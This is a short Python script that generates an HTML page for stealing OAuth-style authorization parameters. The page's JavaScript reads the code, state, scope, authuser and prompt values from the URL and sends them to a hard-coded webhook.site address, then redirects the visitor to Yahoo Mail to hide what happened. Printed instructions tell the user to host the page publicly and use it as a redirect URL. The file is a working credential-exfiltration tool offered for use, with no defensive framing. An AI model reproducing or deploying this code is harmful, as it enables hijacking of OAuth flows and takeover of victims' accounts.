import sys

def generate_auto_exfiltration_page(webhook_url):
    """
    Generate an HTML page to automatically exfiltrate sensitive parameters from the URL.
    - webhook_url: The Webhook URL to log data (e.g., from webhook.site)
    """
    try:
        # HTML content with JavaScript to capture parameters from the URL and send them to Webhook
        html_content = f"""
        <html>
        <head>
            <title>Processing...</title>
        </head>
        <body>
            <p>Please wait...</p>
            <script>
                // Capture all query parameters from the URL
                const urlParams = new URLSearchParams(window.location.search);
                const code = urlParams.get('code') || 'No code found';
                const state = urlParams.get('state') || 'No state found';
                const scope = urlParams.get('scope') || 'No scope found';
                const authuser = urlParams.get('authuser') || 'No authuser found';
                const prompt = urlParams.get('prompt') || 'No prompt found';
                
                // Send the captured data to Webhook
                const data = `Code: ${{code}}, State: ${{state}}, Scope: ${{scope}}, Authuser: ${{authuser}}, Prompt: ${{prompt}}`;
                fetch('{webhook_url}?data=' + encodeURIComponent(data))
                    .then(response => console.log('Data sent to Webhook'))
                    .catch(error => console.error('Error sending to Webhook:', error));

                // Final redirect to mail.yahoo.com after 5 seconds
                setTimeout(function() {{
                    window.location.href = "https://mail.yahoo.com";
                }}, 5000);
            </script>
        </body>
        </html>
        """
        
        # Save the HTML page with UTF-8 encoding
        with open('auto_exfiltration_page.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print("Generated auto_exfiltration_page.html")
        print("Host this page on a public server (e.g., GitHub Pages, Replit) and use its URL in redirectURL.")
        print(f"Monitor Webhook requests at: {webhook_url}")
        
        return html_content
    except Exception as e:
        print(f"Error generating page: {str(e)}", file=sys.stderr)
        return None

if __name__ == "__main__":
    # Replace this with your Webhook URL from webhook.site
    webhook_url = "https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25"
    
    # Generate the page
    html_content = generate_auto_exfiltration_page(webhook_url)
    if html_content is None:
        sys.exit(1)